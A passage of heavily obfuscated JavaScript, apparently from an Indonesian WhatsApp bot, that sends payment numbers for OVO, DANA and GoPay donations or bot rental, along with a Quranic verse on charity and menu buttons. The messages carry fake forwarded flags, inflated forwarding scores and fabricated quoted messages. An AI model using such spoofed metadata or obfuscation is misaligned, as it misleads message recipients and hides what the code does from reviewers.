_0x335e93={};_0x335e93[_0x1e23e4(0x6ea,0x7aa,0x3fc,0x496)]=_0x593f96(0x4fd,0x107,0x620,0xc8)+'21',_0x335e93[_0x1e23e4(0xa55,0xd3b,0x8c6,0x658)+'o']=_0x481aa6,_0x335e93[_0x593f96(0x991,0xb0a,0x926,0x7bc)]=fkontak,_0x335e93[_0x593f96(0x320,0x5b4,0x2aa,0x708)+'ral']=!![],alpha[_0x593f96(0x863,0x717,0x85f,0x81b)+'e'](from,btn6,MessageType[_0x593f96(0x4e9,0x764,0x22,0x18a)+'sage'],_0x335e93);}if(subscribezeeoneofc==_0x593f96(0x791,0xb46,0x50a,0xafe)+_0x1e23e4(0x186,-0x99,0x44d,0x741)){console['log'](_0x593f96(0x567,0x347,0xea,0x7d)+_0x1e23e4(0x196,0x88,0x24f,-0xc),_0x593f96(0xa74,0xdb0,0xb0f,0x745)+_0x593f96(0x834,0xb47,0x7bd,0x7d2)+']',wib,color(_0x593f96(0x2e1,0x6d9,0x54e,0x7b5)+_0x593f96(0xb5c,0xea6,0xb1d,0x850)+'\x20Ovo')),optionsp1=petik+('JASA\x20SEWA\x20'+_0x593f96(0x8a4,0xab2,0x4e6,0xd71))+petik+(_0x1e23e4(0x937,0xe16,0x9de,0x975)+_0x593f96(0xa33,0xccc,0xdbb,0xec8))+pushname+(_0x1e23e4(0xd4,0x853,0x49e,0x1a8)+'\x20:\x20_@')+sender[_0x593f96(0x311,0x1ca,0x7fd,0x1a5)]('@')[0x4cd*0x4+0x9a*-0xb+-0xc96]+_0x1e23e4(0xc95,0xae5,0x9c5,0xa74)+petik+(_0x593f96(0x97e,0xb8d,0x72c,0x72b)+'O')+petik+'\x0a\x0a'+nomor_ovo+('\x0a\x0a_Powered'+_0x1e23e4(0x3be,0x72b,0x322,0x332))+ini_mark[_0x593f96(0x311,0x575,0x25c,0x2b6)]('@')[-0x1*-0x2ed+-0x2*-0xfa7+-0x223b]+'_';const _0xb33e9={};_0xb33e9[_0x1e23e4(0xb4,0x4b6,0xcf,-0x2e4)+'id']=[sender,ini_mark],_0xb33e9[_0x1e23e4(0x4bb,0x369,0x830,0xc40)+_0x593f96(0x7e6,0xa61,0x47a,0xba4)]=0x3e7,_0xb33e9[_0x593f96(0xc8d,0xb89,0x9f7,0xa8f)+'d']=!![];const _0x4b2661={};_0x4b2661[_0x593f96(0x991,0xb66,0xc57,0xdc5)]=fkontak,_0x4b2661[_0x593f96(0xaa4,0xee5,0x5bf,0xa51)+'o']=_0xb33e9,_0x4b2661['sendEpheme'+'ral']=!![],alpha[_0x593f96(0x863,0x419,0x8db,0xc5f)+'e'](from,optionsp1,text,_0x4b2661);}if(subscribezeeoneofc=='langsung_d'+'ana13'){console['log'](_0x593f96(0x567,0x3fa,0x8fc,0x20a)+_0x1e23e4(0x6f5,-0x1c7,0x24f,0x6),_0x1e23e4(0x5f4,0xb7e,0x896,0x733)+_0x593f96(0x834,0xd33,0x7f8,0x576)+']',wib,color(_0x1e23e4(0x5d6,0x5bd,0x103,0x2cc)+_0x593f96(0xb5c,0xacc,0x7f8,0xf3b)+_0x593f96(0x8e8,0xbb5,0xadf,0x7d5))),optionsp1=petik+(_0x593f96(0x980,0xb96,0x97f,0xa28)+_0x1e23e4(0x231,0x2df,0x6c6,0x804))+petik+(_0x1e23e4(0x99a,0x88a,0x9de,0xc12)+_0x593f96(0xa33,0xec9,0xe7b,0x801))+pushname+('_\x0a•>\x20Nomor'+_0x593f96(0x77e,0xb87,0x2ad,0x9f6))+sender[_0x1e23e4(0x424,-0x94,0x133,0xbe)]('@')[0x1fd2+-0xa63+0x156f*-0x1]+_0x593f96(0xba3,0x91e,0x8b4,0x691)+petik+(_0x1e23e4(0x86,0x466,0x126,-0xa1)+'NA')+petik+'\x0a\x0a'+nomor_dana+(_0x593f96(0x46d,0x899,0x795,-0x3b)+'\x20by\x20@')+ini_mark[_0x593f96(0x311,-0x180,0x4b2,0x702)]('@')[0x4*0x3ae+-0x13d*0x2+-0x2*0x61f]+'_';const _0x333753={};_0x333753['mentionedJ'+'id']=[sender,ini_mark],_0x333753[_0x1e23e4(0x988,0x7fb,0x830,0xc77)+_0x1e23e4(0x11a,0x26b,0x608,0x839)]=0x3e7,_0x333753[_0x1e23e4(0x8c3,0x8e1,0xaaf,0xb70)+'d']=!![];const _0x312bba={};_0x312bba[_0x1e23e4(0xc55,0x590,0x7b3,0x881)]=fkontak,_0x312bba[_0x593f96(0xaa4,0x96c,0xb1d,0xf61)+'o']=_0x333753,_0x312bba['sendEpheme'+'ral']=!![],alpha[_0x593f96(0x863,0xb2f,0x9a4,0xce5)+'e'](from,optionsp1,text,_0x312bba);}if(subscribezeeoneofc==_0x593f96(0x736,0xaa5,0x412,0x5d9)+'opay13'){console[_0x1e23e4(0x6c2,0x37d,0x58e,0x95a)](_0x1e23e4(-0x103,0x43a,0x389,-0x2)+_0x593f96(0x42d,0x838,0x911,0x568),_0x1e23e4(0x6af,0xaae,0x896,0x730)+_0x1e23e4(0x91a,0x88f,0x656,0x306)+']',wib,color(_0x593f96(0x2e1,0x338,0x4f7,-0xc7)+_0x593f96(0xb5c,0xda3,0xa82,0xd45)+_0x1e23e4(0x73b,0xa7d,0x70f,0xa70))),optionsp1=petik+(_0x1e23e4(0xb31,0x4b0,0x7a2,0x493)+'BOT')+petik+(_0x1e23e4(0x61e,0x70c,0x9de,0xce9)+_0x593f96(0xa33,0x8ab,0xdac,0x599))+pushname+(_0x1e23e4(0x103,0x6d0,0x49e,0x606)+_0x593f96(0x77e,0x7cc,0x2a5,0x545))+sender[_0x1e23e4(0x3ce,0x5f,0x133,0x5dd)]('@')[-0x6*-0x2d9+0x1*-0x2363+-0x1*-0x124d]+'_\x0a\x0a'+petik+('PAYMENT\x20GO'+_0x593f96(0x945,0x815,0xe2b,0x5fe))+petik+'\x0a\x0a'+nomor_gopay+(_0x593f96(0x46d,-0x87,0x7de,0x3d0)+'\x20by\x20@')+ini_mark['split']('@')[0x18a8*-0x1+-0x81*-0x2b+0x2fd]+'_';const _0x2173c2={};_0x2173c2[_0x1e23e4(0x4a5,-0x386,0xcf,-0x39c)+'id']=[sender,ini_mark],_0x2173c2[_0x1e23e4(0x829,0x9ef,0x830,0x975)+'Score']=0x3e7,_0x2173c2[_0x593f96(0xc8d,0xa53,0xf53,0xeb8)+'d']=!![];const _0x35b366={};_0x35b366[_0x1e23e4(0x640,0x50c,0x7b3,0x3d0)]=fkontak,_0x35b366[_0x593f96(0xaa4,0x8a0,0x889,0x7ec)+'o']=_0x2173c2,_0x35b366[_0x1e23e4(0x4d9,-0x20,0x142,-0x31)+_0x593f96(0x3c2,0x396,0x815,-0xe2)]=!![],alpha[_0x593f96(0x863,0x5ce,0xd02,0x474)+'e'](from,optionsp1,text,_0x35b366);}if(subscribezeeoneofc==_0x1e23e4(0x214,-0xe5,0x12d,0x247)){var ini_info=_0x593f96(0xcd3,0xe7e,0xd73,0xe8a)+sender[_0x593f96(0x311,0x3b3,0x7cc,0x5e0)]('@')[0x18*-0x62+0x1324+0x1a*-0x62]+(_0x1e23e4(0x781,0x68e,0x754,0xbdc)+'\x20donasi\x20vi'+_0x593f96(0x3b3,0x376,0x36c,0x3d5)+_0x1e23e4(0x20a,-0xfe,0x330,0x351)+_0x593f96(0xbcc,0x7c6,0xbc5,0x7a6)+'PAY.\x20Untuk'+_0x593f96(0x6a3,0x620,0x230,0xa72)+_0x1e23e4(0x291,0xd6,0x230,0xdb)+'sa\x20hubungi'+_0x1e23e4(0x92b,0x95b,0x7ee,0x3d8)+_0x1e23e4(0x54a,0x5e2,0x146,-0xc6));const _0x323f71={};_0x323f71['displayTex'+'t']='OVO';const _0x30f670={};_0x30f670[_0x593f96(0x3de,0xed,0x7ca,-0x92)]=_0x1e23e4(0x3b6,0x70b,0x306,0x225)+'8',_0x30f670[_0x593f96(0x2a4,0x14,0x33b,0x3aa)]=_0x323f71,_0x30f670[_0x593f96(0xb7e,0x825,0x836,0xc5a)]=0x1;const _0x457595={};_0x457595['displayTex'+'t']='DANA';const _0x51d693={};_0x51d693[_0x593f96(0x3de,-0x106,0x79c,0x53f)]=_0x593f96(0x975,0xc85,0xb30,0x464)+'18',_0x51d693[_0x1e23e4(-0x18c,-0x215,0xc6,-0x225)]=_0x457595,_0x51d693[_0x593f96(0xb7e,0x6ae,0xe11,0xaf5)]=0x1;const _0x1c8e31={};_0x1c8e31[_0x593f96(0x3bc,0x24c,0x2fb,0x53d)+'t']='GOPAY';const _0x13a00e={};_0x13a00e[_0x1e23e4(0x70e,0x5c0,0x200,0x6df)]='bayar_gopa'+_0x593f96(0x7d0,0x9ad,0x43a,0x632),_0x13a00e[_0x593f96(0x2a4,-0x225,0x4ea,0x756)]=_0x1c8e31,_0x13a00e[_0x1e23e4(0x5b1,0xb28,0x9a0,0x905)]=0x1;const buttons3=[_0x30f670,_0x51d693,_0x13a00e],_0x202751={};_0x202751['contentTex'+'t']=ini_info,_0x202751[_0x1e23e4(0x467,0x7c0,0x3d2,0x63d)]=''+tampilTanggal+enter+tampilWaktu+enter+enter+'©\x20'+creator,_0x202751[_0x593f96(0xacd,0x8c2,0xdb5,0xfa2)]=buttons3,_0x202751[_0x1e23e4(0x627,0x4f1,0x79a,0x2e8)]=0x1;const btn3=_0x202751,_0x4a51a1={};_0x4a51a1[_0x593f96(0xc48,0xa79,0xe3a,0x7cf)]='hi',_0x4a51a1[_0x1e23e4(0x425,0x698,0x830,0x997)+_0x593f96(0x7e6,0xb20,0xbe6,0x811)]=0x3b9aca00,_0x4a51a1[_0x593f96(0xc8d,0x8a8,0x947,0xf08)+'d']=!![],_0x4a51a1[_0x593f96(0x320,-0x2f,0x4b5,0x375)+_0x593f96(0x3c2,0x3b1,0x65b,0x54c)]=!![],_0x4a51a1[_0x1e23e4(-0xd6,-0x1be,0xcf,0x29e)+'id']=[sender];const _0x69e2a1={};_0x69e2a1[_0x593f96(0x5da,0x97e,0x9d0,0xa41)]=_0x593f96(0x4fd,0x9bd,0x391,0x4af)+'21',_0x69e2a1['contextInf'+'o']=_0x4a51a1,_0x69e2a1[_0x593f96(0x991,0xcd9,0xade,0x82a)]=ftroli,_0x69e2a1['sendEpheme'+'ral']=!![],alpha[_0x593f96(0x863,0x435,0x477,0x4ad)+'e'](from,btn3,MessageType[_0x1e23e4(0x52b,0xe4,0x30b,-0x9c)+'sage'],_0x69e2a1);}if(subscribezeeoneofc=='bayar_ovo1'+'8'){var ini_info='Hay\x20@'+sender[_0x593f96(0x311,0x1f2,-0x85,0x7e4)]('@')[0x1*0x2318+-0x1*-0x1dcd+0x1*-0x40e5]+(_0x593f96(0x932,0x61c,0xc84,0x9d5)+'\x20bayar\x20pak'+'e\x20nomor\x20aj'+'a\x20atau\x20pak'+_0x1e23e4(0x869,0x4bb,0x405,0x42));const _0x2607b8={};_0x2607b8[_0x1e23e4(0x611,0x337,0x1de,0x1e)+'t']='NOMOR';const _0x43d536={};_0x43d536[_0x593f96(0x3de,0x816,0xff,0x356)]=_0x1e23e4(0xa73,0x4b4,0x5b3,0x590)+_0x1e23e4(0x1b2,0x14b,0x430,0x893),_0x43d536[_0x593f96(0x2a4,0x22b,0x554,0xed)]=_0x2607b8,_0x43d536[_0x593f96(0xb7e,0x79b,0xa11,0xc8a)]=0x1;const _0x886f21={};_0x886f21[_0x593f96(0x3bc,0x268,0x794,0x403)+'t']=_0x593f96(0xbf7,0x8d6,0xd2e,0x7d6);const _0x51564f={};_0x51564f[_0x593f96(0x3de,0x294,0x12e,0x6b0)]=_0x593f96(0x494,0x273,0x642,0x5c6),_0x51564f[_0x1e23e4(0x56e,-0x317,0xc6,-0x438)]=_0x886f21,_0x51564f[_0x593f96(0xb7e,0xd97,0xe04,0x905)]=0x1;const buttons4=[_0x43d536,_0x51564f],_0x251ea8={};_0x251ea8['contentTex'+'t']=ini_info,_0x251ea8['footerText']=''+tampilTanggal+enter+tampilWaktu+enter+'©\x20'+creator,_0x251ea8['buttons']=buttons4,_0x251ea8['headerType']=0x1;const btn4=_0x251ea8,_0xe6f8fa={};_0xe6f8fa[_0x593f96(0xc48,0xfca,0xdfd,0xa08)]='hi',_0xe6f8fa[_0x593f96(0xa0e,0xcae,0xe00,0x599)+_0x1e23e4(0x504,0x32b,0x608,0xa5d)]=0x3b9aca00,_0xe6f8fa[_0x1e23e4(0xbff,0x6ab,0xaaf,0xaf7)+'d']=!![],_0xe6f8fa[_0x1e23e4(-0x245,0x370,0x142,-0x1a)+'ral']=!![],_0xe6f8fa['mentionedJ'+'id']=[sender];const _0x3eb820={};_0x3eb820[_0x593f96(0x5da,0x14a,0x8b7,0x341)]=_0x593f96(0x4fd,0x823,0x96,0x954)+'21',_0x3eb820[_0x1e23e4(0x860,0x57e,0x8c6,0xc73)+'o']=_0xe6f8fa,_0x3eb820[_0x1e23e4(0x7f0,0x5b6,0x7b3,0x3f4)]=ftroli,_0x3eb820['sendEpheme'+_0x593f96(0x3c2,0xa2,0x74c,0x2ee)]=!![],alpha[_0x1e23e4(0x5ea,0x569,0x685,0x746)+'e'](from,btn4,MessageType[_0x1e23e4(0x2d5,0x7dc,0x30b,0x416)+_0x1e23e4(0xe7a,0x6f2,0xa7d,0xb8c)],_0x3eb820);}if(subscribezeeoneofc==_0x593f96(0x791,0x944,0x858,0x3e3)+'vo18'){optionsp1='“Sesungguh'+'nya\x20orang-'+_0x1e23e4(0x85a,0x909,0x439,0x34f)+'\x20bersedeka'+_0x593f96(0x954,0xbaf,0x467,0x8ef)+_0x1e23e4(0x588,0x37c,0x5d2,0x762)+'pun\x20peremp'+_0x593f96(0xc66,0xf27,0x783,0x94c)+_0x593f96(0x64b,0x571,0x4ff,0x4bc)+_0x1e23e4(0xd2e,0x7f5,0xa86,0x5f5)+_0x593f96(0x74e,0xbbd,0xa25,0x62b)+'n\x20yang\x20bai'+_0x593f96(0x3eb,0x1dd,0xf8,0x188)+_0x1e23e4(-0x117,-0x130,0xe1,-0x200)+_0x1e23e4(0x27d,0x62b,0x63a,0xb45)+_0x593f96(0x6fc,0x6b2,0x284,0x4d1)+_0x1e23e4(0x117,0x66a,0x197,-0x1ea)+_0x1e23e4(0xd41,0x8c1,0x8d9,0x547)+_0x1e23e4(-0x9,0x57d,0x36b,0x56f)+_0x1e23e4(0xefc,0xc4b,0xa68,0xdf2)+'hala\x20yang\x20'+_0x1e23e4(0x35c,0x8d9,0x3cf,0x77a)+_0x1e23e4(0x978,0x736,0x644,0x4d2)+_0x593f96(0x804,0x9b6,0x8e2,0xc20)+_0x1e23e4(0x413,0x112,0x602,0xacb)+pushname+(_0x1e23e4(0x392,0x744,0x858,0x529)+_0x1e23e4(0x8d,0x790,0x3a2,0x656))+sender[_0x1e23e4(-0x117,0x2da,0x133,0x5dd)]('@')[0x503*0x7+0x7b*0x1d+0x2*-0x1882]+(_0x593f96(0x84d,0xd2b,0xcaf,0x464)+_0x593f96(0x389,-0x14b,0x38f,0x3a7))+nomor_ovo+(_0x593f96(0x46d,0x87b,0x2ed,0x679)+_0x593f96(0x500,0x9e2,0x34e,0x346))+ini_mark[_0x593f96(0x311,0x71b,0x550,0xcd)]('@')[-0x1e5f*0x1+0x1fec+-0x1*0x18d]+'_';const _0x517b8d={};_0x517b8d[_0x593f96(0x2ad,0x29b,-0xc,0x2c0)+'id']=[sender,ini_mark],_0x517b8d[_0x593f96(0xa0e,0x75c,0xe1a,0xaac)+_0x1e23e4(0x167,0x7f7,0x608,0xa91)]=0x3e7,_0x517b8d['isForwarde'+'d']=!![];const _0x442ad9={};_0x442ad9[_0x1e23e4(0x42e,0x6c0,0x7b3,0x670)]=fkontak,_0x442ad9['contextInf'+'o']=_0x517b8d,_0x442ad9[_0x593f96(0x320,0x74b,0x2e3,0x6d0)+'ral']=!![],alpha['sendMessag'+'e'](from,optionsp1,text,_0x442ad9);}if(subscribezeeoneofc==_0x1e23e4(0x75e,0x9fc,0x797,0xb60)+'18'){var ini_info=_0x593f96(0xcd3,0xde7,0x1072,0x7e3)+sender[_0x593f96(0x311,0x406,0x339,0x30b)]('@')[0x9*0x309+-0x239*0x3+-0xa53*0x2]+(_0x1e23e4(0xc6d,0x887,0x754,0x67e)+'\x20bayar\x20pak'+_0x593f96(0x6c4,0x9c7,0x964,0x5f0)+_0x593f96(0x680,0x4f3,0x650,0x1c0)+_0x1e23e4(0x5d6,0x41a,0x405,-0x23));const _0x65ce4e={};_0x65ce4e[_0x593f96(0x3bc,0x5a0,-0xb7,0x1b5)+'t']=_0x593f96(0xa14,0xc71,0x8b8,0x97d);const _0x55b614={};_0x55b614[_0x1e23e4(0x193,0xc4,0x200,0x51e)]=_0x1e23e4(0x8e3,0x74f,0x4dd,0x8dd)+_0x593f96(0x789,0x4a1,0xb57,0x3dd),_0x55b614[_0x593f96(0x2a4,0x1fb,-0xb4,0x742)]=_0x65ce4e,_0x55b614[_0x1e23e4(0x783,0x94d,0x9a0,0xc3f)]=0x1;const _0x4090a4={};_0x4090a4[_0x1e23e4(-0x58,-0x40,0x1de,0x1e2)+'t']=_0x593f96(0xbf7,0xdbc,0x10bd,0xda3);const _0x52b195={};_0x52b195[_0x1e23e4(0x600,-0x205,0x200,0x5db)]=_0x1e23e4(0x84d,0x29e,0x441,0x7d6),_0x52b195['buttonText']=_0x4090a4,_0x52b195[_0x1e23e4(0x886,0xeb3,0x9a0,0xe29)]=0x1;const buttons5=[_0x55b614,_0x52b195],_0x5f5d98={};_0x5f5d98[_0x593f96(0x4b5,0x341,0x441,0x706)+'t']=ini_info,_0x5f5d98[_0x1e23e4(0x357,-0x12c,0x3d2,0x6c4)]=''+tampilTanggal+enter+tampilWaktu+enter+enter+'©\x20'+creator,_0x5f5d98[_0x1e23e4(0x557,0x58a,0x8ef,0x45b)]=buttons5,_0x5f5d98[_0x593f96(0x978,0xb85,0xced,0x50e)]=0x1;const btn5=_0x5f5d98,_0xa49d1d={};_0xa49d1d[_0x593f96(0xc48,0x962,0xe70,0xfb5)]='hi',_0xa49d1d['forwarding'+_0x593f96(0x7e6,0x712,0x398,0x8d3)]=0x3b9aca00,_0xa49d1d['isForwarde'+'d']=!![],_0xa49d1d[_0x1e23e4(-0x2dd,-0xe7,0x142,-0x3b4)+'ral']=!![],_0xa49d1d['mentionedJ'+'id']=[sender];const _0x13c24c={};_0x13c24c[_0x593f96(0x5da,0xf1,0x791,0x154)]='Botwea\x20©2k'+'21',_0x13c24c[_0x1e23e4(0x81b,0x967,0x8c6,0xb48)+'o']=_0xa49d1d,_0x13c24c['quoted']=ftroli,_0x13c24c['sendEpheme'+_0x1e23e4(-0xa6,0x427,0x1e4,0x478)]=!![],alpha['sendMessag'+'e'](from,btn5,MessageType[_0x1e23e4(0x5ba,-0x99,0x30b,0x460)+'sage'],_0x13c24c);}if(subscribezeeoneofc==_0x593f96(0x6bb,0x8c8,0x245,0xaf6)+_0x1e23e4(0x3c7,0x8d0,0x5ab,0x94d)){optionsp2='“Sesungguh'+_0x593f96(0x4ea,0x577,0x845,0x847)+'orang\x20yang'+_0x1e23e4(0x9e3,0x591,0x64f,0x370)+'h\x20baik\x20lak'+'i-laki\x20mau'+_0x1e23e4(0x47f,0x819,0x7e3,0x8ab)+'uan\x20dan\x20me'+_0x1e23e4(0x266,0x462,0x46d,0x75b)+_0x1e23e4(0xc8c,0x68a,0xa86,0xf63)+_0x1e23e4(0x93b,0x104,0x570,0xa0c)+_0x1e23e4(-0x95,-0x14b,0x1bc,-0x2)+_0x593f96(0x3eb,-0xc0,0x495,0x9c)+_0x593f96(0x2bf,-0xc5,0x562,0x140)+'pat-gandak'+'an\x20(ganjar'+_0x1e23e4(0x30d,0x26d,0x197,0x3c1)+_0x1e23e4(0xbbc,0x742,0x8d9,0x8be)+_0x593f96(0x549,0x605,0x8fc,0xa14)+_0x1e23e4(0x884,0x87e,0xa68,0xd1f)+_0x1e23e4(0x79f,0xcdc,0x99c,0x648)+_0x593f96(0x5ad,0x893,0x890,0x4d1)+_0x1e23e4(0x93d,0x547,0x644,0xac2)+_0x593f96(0x804,0x779,0x8be,0x461)+_0x593f96(0x7e0,0xa97,0x3bc,0x3ac)+pushname+(_0x593f96(0xa36,0xd14,0xba4,0xaee)+_0x1e23e4(0x62b,0x436,0x3a2,0x5c))+sender[_0x1e23e4(0x172,-0x320,0x133,0x23b)]('@')[0x373*0x4+0x1e7+0xfb3*-0x1]+(_0x1e23e4(0x396,0x805,0x66f,0x7b9)+_0x593f96(0x389,0x152,0x76e,-0x82))+nomor_dana+('\x0a\x0a_Powered'+_0x1e23e4(0x760,0x14,0x322,0x414))+ini_mark[_0x1e23e4(0x21e,0x310,0x133,0x2d3)]('@')[0x1ba5+-0x1fd4+0x33*0x15]+'_';const _0x50f921={};_0x50f921[_0x1e23e4(-0x3fa,-0x1ba,0xcf,0x479)+'id']=[sender,ini_mark],_0x50f921[_0x593f96(0xa0e,0x90b,0x93e,0xf28)+_0x1e23e4(0x311,0x271,0x608,0x455)]=0x3e7,_0x50f921[_0x593f96(0xc8d,0xa73,0xffe,0x773)+'d']=!![];const _0x33738f={};_0x33738f[_0x593f96(0x991,0xd32,0x5da,0xd05)]=fkontak,_0x33738f['contextInf'+'o']=_0x50f921,_0x33738f[_0x593f96(0x320,0x619,0x19d,0x317)+_0x1e23e4(-0x5,0x2d2,0x1e4,0x52b)]=!![],alpha['sendMessag'+'e'](from,optionsp2,text,_0x33738f);}if(subscribezeeoneofc==_0x1e23e4(0xc9f,0x4c1,0x81a,0x9cc)+'y18'){var ini_info='Hay\x20@'+sender[_0x593f96(0x311,0x52c,0x7e9,0x1d)]('@')[-0x54a+0x1b05*-0x1+-0x204f*-0x1]+(_0x593f96(0x932,0x9e5,0xb25,0x8e8)+_0x593f96(0x64d,0x631,0x8a2,0xa0d)+'e\x20nomor\x20aj'+'a\x20atau\x20pak'+_0x1e23e4(0x6fa,0x793,0x405,0x1c9));const _0x3f860b={};_0x3f860b[_0x593f96(0x3bc,-0x17,0xe4,0x73c)+'t']=_0x1e23e4(0xc91,0x95c,0x836,0x4c5);const _0x49f77e={};_0x49f77e[_0x593f96(0x3de,0x29a,0x156,0x8e3)]=_0x593f96(0x736,0x8d0,0xb99,0xba4)+_0x1e23e4(0x4ab,0xe6,0x473,0x825),_0x49f77e[_0x1e23e4(-0x345,-0x3d1,0xc6,-0xc2)]=_0x3f860b,_0x49f77e['type']=0x1;const _0x34ba04={};_0x34ba04[_0x593f96(0x3bc,0x3f1,0x267,0x6eb)+'t']=_0x593f96(0xbf7,0x1021,0x738,0xa28);const _0x1bb3c7={};_0x1bb3c7[_0x593f96(0x3de,0x44b,0xbd,0x890)]=_0x593f96(0xb1b,0xfce,0xfc4,0x993),_0x1bb3c7['buttonText']=_0x34ba04,_0x1bb3c7[_0x1e23e4(0x579,0xb1b,0x9a0,0xd4a)]=0x1;const buttons6=[_0x49f77e,_0x1bb3c7],_0x1e9d83={};_0x1e9d83['contentTex'+'t']=ini_info,_0x1e9d83['footerText']=''+tampilTanggal+enter+tampilWaktu+enter+'©\x20'+creator,_0x1e9d83[_0x1e23e4(0x646,0x98c,0x8ef,0xd46)]=buttons6,_0x1e9d83[_0x593f96(0x978,0xa3f,0x548,0x91e)]=0x1;const btn6=_0x1e9d83,_0x437184={};_0x437184[_0x1e23e4(0xe91,0xaed,0xa6a,0xdb6)]='hi',_0x437184[_0x593f96(0xa0e,0xe29,0x7fe,0xcbc)+_0x593f96(0x7e6,0x466,0x565,0x4ec)]=0x3b9aca00,_0x437184[_0x1e23e4(0xaaf,0xd64,0xaaf,0xb49)+'d']=!![],_0x437184[_0x1e23e4(0xa2,-0x38,0x142,0x5d6)+_0x593f96(0x3c2,0x482,0x757,0x7b0)]=!![],_0x437184[_0x593f96(0x2ad,-0x1fc,0x793,0x610)+'id']=[sender];const _0x428b2e={};_0x428b2e[_0x593f96(0x5da,0x1f9,0x21e,0x1ee)]=_0x593f96(0x4fd,0x261,0x10,0x6c6)+'21',_0x428b2e['contextInf'+'o']=_0x437184,_0x428b2e[_0x1e23e4(0x313,0x972,0x7b3,0x611)]=ftroli,_0x428b2e[_0x1e23e4(0x30c,0x1d9,0x142,0x525)+_0x1e23e4(-0xb,-0x21e,0x1e4,-0xf2)]=!![],alpha[_0x1e23e4(0x9e2,0x5ba,0x685,0x997)+'e'](from,btn6,MessageType[_0x1e23e4(-0x12e,0xd3,0x30b,0x52d)+_0x1e23e4(0x983,0x5e1,0xa7d,0xbd2)],_0x428b2e);}if(subscribezeeoneofc==_0x593f96(0x736,0xb55,0xa28,0xa0d)+_0x593f96(0x651,0x3c3,0x775,0x895)){optionsp3=_0x593f96(0x660,0x1dc,0x661,0x97f)+_0x593f96(0x4ea,0x6a4,0x216,0x366)+_0x593f96(0x617,0x93d,0x88d,0x64e)+_0x593f96(0x82d,0x5a7,0xa54,0x842)+_0x593f96(0x954,0xbaf,0x5b5,0xa02)+_0x593f96(0x7b0,0x821,0xa69,0xb3f)+_0x1e23e4(0x82e,0xc06,0x7e3,0x319)+_0x593f96(0xc66,0xabb,0xc0c,0x768)+_0x1e23e4(0x4bd,0x8b8,0x46d,0xa4)+_0x593f96(0xc64,0xde5,0xe34,0xca7)+_0x1e23e4(0x61,0x98d,0x570,0x2b0)+_0x1e23e4(0x2,0x539,0x1bc,0x61)+_0x593f96(0x3eb,0x508,0x33d,0x189)+_0x1e23e4(-0x302,-0x37,0xe1,0x1e3)+'pat-gandak'+_0x1e23e4(0x4f4,0x4e6,0x51e,0x850)+_0x593f96(0x375,0x3ea,0x4e9,0x7fc)+_0x1e23e4(0x961,0xcf3,0x8d9,0x6a5)+_0x593f96(0x549,0x818,0x732,0x861)+'\x20mereka\x20pa'+_0x593f96(0xb7a,0xff5,0x948,0x6cd)+_0x1e23e4(0x59e,0x36d,0x3cf,0x6ce)+'Qs.\x20Al\x20Had'+_0x1e23e4(0x793,0x6ae,0x626,0x750)+_0x1e23e4(0x3e0,0x43c,0x602,0xaa3)+pushname+(_0x1e23e4(0xbaf,0x927,0x858,0x866)+_0x593f96(0x580,0x671,0x6e9,0x3eb))+sender['split']('@')[0x1eae+-0x1bc5+-0x1*0x2e9]+('_\x0a\x0a*PAYMEN'+_0x593f96(0x389,0x5b2,0x83,-0x117))+nomor_gopay+(_0x1e23e4(0x61d,0x59c,0x28f,-0x46)+_0x593f96(0x500,0x232,0x838,0x4a6))+ini_mark[_0x593f96(0x311,0x3eb,-0x191,0x694)]('@')[-0x105d+-0x1abd+-0x9*-0x4ca]+'_';const _0x1a5434={};_0x1a5434['mentionedJ'+'id']=[sender,ini_mark],_0x1a5434[_0x593f96(0xa0e,0x6f6,0xc2b,0xd47)+_0x593f96(0x7e6,0x751,0x847,0x9c0)]=0x3e7,_0x1a5434[_0x593f96(0xc8d,0xd1f,0x933,0x1079)+'d']=!![];const _0x51e570={};_0x51e570[_0x1e23e4(0xaa6,0x398,0x7b3,0xa01)]=fkontak,_0x51e570[_0x1e23e4(0xb80,0x9cc,0x8c6,0x3bf)+'o']=_0x1a5434,_0x51e570[_0x1e23e4(0x4b5,-0x311,0x142,-0x138)+_0x593f96(0x3c2,0x483,0x4cb,0x50)]=!![],alpha[_0x593f96(0x863,0xd70,0x498,0x9f6)+'e'](from,optionsp3,text,_0x51e570);}subscribezeeoneofc=='escesiapa'&&(console[_0x593f96(0x76c,0x650,0xacf,0xbc6)](color(time,_0x1e23e4(-0x14a,0x630,0x17b,0x4be)),color(_0x1e23e4(0x192,-0x77,0x3a9,-0xce)+_0x1e23e4(0xd16,0xbf9,0xa47,0x6ff)+_0x1e23e4(0x38e,0xab9,0x60d,0x5ca))),reply('☕'));if(subscribezeeoneofc==_0x1e23e4(0x20e,-0x5c,0x134,-0x171)){console[_0x1e23e4(0x494,0x81c,0x58e,0xee)](color(time,_0x1e23e4(0x10a,0x3bf,0x17b,0x5e4)),color(_0x593f96(0x6e8,0x442,0x26c,0x2a1)+_0x1e23e4(0x71d,0x685,0x6cc,0xb5c)));const _0x3e1778={};_0x3e1778[_0x1e23e4(0x5db,0x4df,0x77a,0xa10)]=_0x1e23e4(0x464,0x8b0,0x399,0x4a9)+'ot',_0x3e1778['descriptio'+'n']=_0x593f96(0xccc,0x9f9,0x11bd,0x9d2)+_0x1e23e4(0xdfe,0x707,0x9c2,0xc94)+_0x593f96(0x6a7,0x446,0xb61,0xb64)+_0x593f96(0x725,0x374,0x9a2,0x470)+_0x593f96(0x475,0x6e5,0x36,-0x2b)+'and_',_0x3e1778[_0x1e23e4(0xeaf,0x69b,0xa6e,0xb78)]='0';const _0x18dc83={};_0x18dc83['title']=_0x1e23e4(0x8f3,0xbf0,0x9bb,0x60e)+_0x1e23e4(-0x59,0x575,0x395,0x351),_0x18dc83[_0x1e23e4(0x94a,0xa77,0x6c2,0x36e)]=[_0x3e1778];const _0x127633={};_0x127633['title']=_0x593f96(0x4cc,0x290,0x42,0x5e0)+'nu',_0x127633[_0x593f96(0x3f1,-0x104,-0xe9,0x7da)+'n']='\x0a\x0a_choose\x20'+_0x1e23e4(0x975,0x816,0x9c2,0x9a8)+'u\x20want\x20to\x20'+_0x1e23e4(0x58b,-0xaf,0x2f5,0x21d)+_0x1e23e4(0x56e,0xd3e,0xa39,0xdf2)+_0x593f96(0x608,0x713,0x1b3,0xaf5),_0x127633['rowId']='0';const _0x8f2261={};_0x8f2261[_0x593f96(0x958,0xa74,0xd60,0x816)]=_0x1e23e4(0x7c6,0xa73,0x779,0x765)+'1',_0x8f2261[_0x593f96(0x8a0,0x444,0x5ca,0x431)]=[_0x127633];const 